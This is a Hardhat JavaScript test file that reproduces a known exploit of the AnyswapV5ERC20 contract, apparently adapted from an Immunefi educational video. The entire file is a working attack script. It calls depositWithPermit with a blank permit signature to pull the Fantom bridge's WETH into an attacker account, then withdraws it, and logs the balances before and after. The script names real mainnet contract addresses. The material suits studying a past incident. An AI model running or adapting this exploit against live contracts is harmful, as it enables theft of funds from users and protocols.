// Script created based on immunefi's dark forest series episode 0.
// Last retreived 26. Jan
// https://www.youtube.com/watch?v=aO4C-g4Ilkg&list=PL52dAIaZ3XKDNb0VC3Ah6kgdOb4sNdhp9&index=1

const {
  time,
  loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");


describe("AnyswapV5ERC20", function () {
  it("Should steal fantom bridges token", async function () {
    const weth_address = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
    const anyswapv5erc20_address = "0xB153FB3d196A8eB25522705560ac152eeEc57901";
    const fantom_bridge_address = "0xC564EE9f21Ed8A2d8E7e76c085740d5e4c5FaFbE";

    const [attacker] = await ethers.getSigners();
    console.log("Attacker:", attacker.address)

    const WETH = await ethers.getContractAt("IERC20", weth_address);
    const anyswapV5ERC20 = await ethers.getContractAt("IAnyswapV5ERC20", anyswapv5erc20_address);

    let allowance = await WETH.allowance(fantom_bridge_address, anyswapV5ERC20.address);
    // console.log(allowance)

    let bridgeBalanceBefore = await WETH.balanceOf(fantom_bridge_address)
    console.log("Bridge balance before:", ethers.utils.formatEther(bridgeBalanceBefore))

    let attackerBalanceBefore = await WETH.balanceOf(attacker.address)
    console.log("Attacker balance before:",  ethers.utils.formatEther(attackerBalanceBefore))

    await anyswapV5ERC20.connect(attacker).depositWithPermit(fantom_bridge_address, bridgeBalanceBefore, 0, "0x0", "0x0000000000000000000000000000000000000000000000000000000000000000", "0x0000000000000000000000000000000000000000000000000000000000000000", attacker.address)

    let bridgeBalanceAfter = await WETH.balanceOf(fantom_bridge_address);
    console.log("Bridge balance after:", ethers.utils.formatEther(bridgeBalanceAfter))

    let withdraw = await anyswapV5ERC20.connect(attacker).withdraw()
    //console.log("Withdraw:", withdraw)


    let attackerBalanceAfter = await WETH.balanceOf(attacker.address)
    console.log("Attacker balance after:",  ethers.utils.formatEther(attackerBalanceAfter))
  });

});

